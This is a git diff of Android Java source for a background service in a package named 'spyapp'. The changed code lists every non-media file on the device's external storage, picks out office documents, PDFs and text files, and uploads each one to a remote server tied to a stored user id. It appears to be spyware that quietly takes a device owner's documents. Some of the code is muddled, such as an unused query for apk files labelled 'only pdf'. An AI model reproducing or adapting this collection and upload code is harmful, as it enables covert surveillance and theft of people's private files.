@@ -3,10 +3,12 @@ package kkactive_india.in.spyapp;
 import android.Manifest;
 import android.app.Activity;
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
@@ -14,6 +16,7 @@ import android.provider.MediaStore;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
+import android.webkit.MimeTypeMap;
 
 import com.google.gson.Gson;
 
@@ -178,38 +181,48 @@ public class MainService extends Service {
 
     private void getAllFilesOfDir(File directory) {
 
-        final File[] files = directory.listFiles();
+      /*if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {  // we can read the External Storage...
+            getAllFilesOfDir(Environment.getExternalStorageDirectory());
+        }*/
+
+
+        ContentResolver cr = this.getContentResolver();
+        Uri uri = MediaStore.Files.getContentUri("external");
+
+
+// every column, although that is huge waste, you probably need
+// BaseColumns.DATA (the path) only.
+        String[] projection = null;
+
+// exclude media files, they would be here also.
+        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
+                + MediaStore.Files.FileColumns.MEDIA_TYPE_NONE;
+        String[] selectionArgs = null; // there is no ? in selection so null here
+
+        String sortOrder = null; // unordered
+        Cursor allNonMediaFiles = cr.query(uri, projection, selection, selectionArgs, sortOrder);
+        // only pdf
+        String selectionMimeType = MediaStore.Files.FileColumns.MIME_TYPE + "=?";
+        String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension("apk");
+        String[] selectionArgsPdf = new String[]{mimeType};
+        Cursor allPdfFiles = cr.query(uri, projection, selectionMimeType, selectionArgsPdf, sortOrder);
+
         list = new ArrayList<String>();
 
-        if (files != null) {
-            for (File file : files) {
 
-                if (file.isDirectory()) {  // it is a folder...
-                    getAllFilesOfDir(file);
-
-                } else {  // it is a file...
-                        /*Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
-                        Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
-                        Log.d("File Name", file.getName());*/
-
-                    if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
-                            || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
-                            || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
-                            || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
-                    {
-                        // Log.e(" FILES",file.getName());
-                        //Log.e(" FILES",file.getAbsolutePath());
-                        this.list.add(file.getAbsolutePath());
-                        Log.e("FileBaba", String.valueOf(list));
-
-                    }
-
-
-
-                }
-
-            }
+        for (int i = 0; i < allNonMediaFiles.getCount(); i++) {
+            allNonMediaFiles.moveToPosition(i);
+            int dataColumnIndex = allNonMediaFiles.getColumnIndex(MediaStore.Files.FileColumns.DATA);//get column index
+            list.add(allNonMediaFiles.getString(dataColumnIndex));//get Image from column index
         }
+
+        file = new File(String.valueOf(list));
+
+        Log.e("PdfBhai", String.valueOf(list));
+        // Log.e("PdfBhai", String.valueOf(allPdfFiles));
+        // Log.e("PdfBhai", String.valueOf(allNonMediaFiles));
+
+
     }
 
 
@@ -235,33 +248,47 @@ public class MainService extends Service {
             MultipartBody.Part body1 = null;
 
             for (int i = 0; i < list.size(); i++) {
+
                 file = new File(list.get(i));
-                RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
-                body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);
 
-                Bean b = (Bean) getApplicationContext();
+                if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
+                        || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
+                        || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
+                        || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
+                {
+                    // Log.e(" FILES",file.getName());
+                    //Log.e(" FILES",file.getAbsolutePath());
 
-                Retrofit retrofit = new Retrofit.Builder()
-                        .baseUrl(b.baseURL)
-                        .addConverterFactory(ScalarsConverterFactory.create())
-                        .addConverterFactory(GsonConverterFactory.create())
-                        .build();
-                Allapi cr = retrofit.create(Allapi.class);
-                String id = pref.getString("id", "");
-                Call<fileBean> call = cr.files(id, body1);
-                call.enqueue(new Callback<fileBean>() {
-                    @Override
-                    public void onResponse(Call<fileBean> call, Response<fileBean> response) {
+                    RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
+                    body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);
 
-                        Log.d("Files", "yess Gaye");
+                    Bean b = (Bean) getApplicationContext();
 
-                    }
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create())
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
+                    String id = pref.getString("id", "");
+                    Call<fileBean> call = cr.files(id, body1);
+                    call.enqueue(new Callback<fileBean>() {
+                        @Override
+                        public void onResponse(Call<fileBean> call, Response<fileBean> response) {
 
-                    @Override
-                    public void onFailure(Call<fileBean> call, Throwable t) {
+                            Log.d("Files", "yess Gaye");
 
-                    }
-                });
+                        }
+
+                        @Override
+                        public void onFailure(Call<fileBean> call, Throwable t) {
+
+                        }
+                    });
+
+                }
+
+
 
             }
 
